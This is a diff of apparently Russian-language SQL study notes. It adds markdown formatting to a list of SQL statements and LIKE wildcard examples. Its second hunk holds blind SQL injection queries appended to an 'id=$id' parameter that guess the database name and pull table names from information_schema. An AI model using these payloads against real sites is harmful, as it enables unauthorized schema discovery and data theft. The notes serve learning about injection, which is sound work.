@@ -1,10 +1,10 @@
-Операторы:
-1. Операторы определения данных.
+***Операторы:***
+**1. Операторы определения данных.**
     1.1 CREATE - создание объекта.
     1.2 ALTER - изменение объекта.
     1.3 DROP - удаление объекта.
 
-2. Операторы манипуляции с данными.
+**2. Операторы манипуляции с данными.**
     2.1 SELECT - выбор данных.
     2.2 INSERT - добавление данных.
     2.3 UPDATE - изменение данных.
@@ -121,10 +121,11 @@ Ex: 'something.com' LIKE '%thing%' - true.
 
     'test.com' LIKE '___t.c__' - true.
     'test.com' LIKE '___t.c_' - false.
+```
 SELECT title, descr, body FROM something WHERE id=$id AND (SELECT 1 FROM dual WHERE database() LIKE '%n%')
 SELECT title, descr, body FROM something WHERE id=$id AND (SELECT 1 FROM dual WHERE database() LIKE '_______')
 SELECT title, descr, body FROM something WHERE id=$id AND (SELECT 1 FROM dual WHERE database() = 'name_bd')
-
+```
 Получение имен таблиц через столбцы.
 SELECT title, descr, body FROM something WHERE id=$id AND (SELECT 1 FROM dual WHERE (SELECT table_name FROM information_schema.columns WHERE table_schema = database() AND column_name LIKE '%user%' limit 0,1) LIKE '%')
 
